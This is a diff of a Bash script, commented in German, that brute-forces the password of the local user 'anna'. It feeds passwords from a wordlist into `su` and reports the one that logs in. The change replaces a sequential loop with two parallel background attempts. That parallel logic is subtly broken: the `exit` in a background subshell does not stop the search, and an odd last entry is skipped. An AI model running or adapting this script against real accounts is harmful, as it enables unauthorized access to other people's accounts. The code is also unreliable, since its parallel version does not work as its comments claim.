@@ -9,25 +9,20 @@ username="anna"
 # Funktion, um Passwörter zu testen
 check_password() {
     local password="$1"
-    local count="$2"
     su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
     if [ $? -eq 0 ]; then
         echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
-        echo "Versuch $count"
         exit 0
     else
         echo "Fehler beim Anmelden als '$username' mit dem Passwort '$password'"
-        echo "Versuch $count"
     fi
 }
 
-# Zähler für den Fortschritt
-attempt_count=0
-
-# Lesen Sie jedes Passwort in der Liste nacheinander ein und überprüfen Sie es
-while IFS= read -r password; do
-    ((attempt_count++))
-    check_password "$password" "$attempt_count"
+# Starte zwei gleichzeitige Subprozesse, um Passwörter zu testen
+while IFS= read -r password1 && IFS= read -r password2; do
+    check_password "$password1" &
+    check_password "$password2" &
+    wait
 done < "$password_list_path"
 
 # Wenn kein gültiges Passwort gefunden wurde
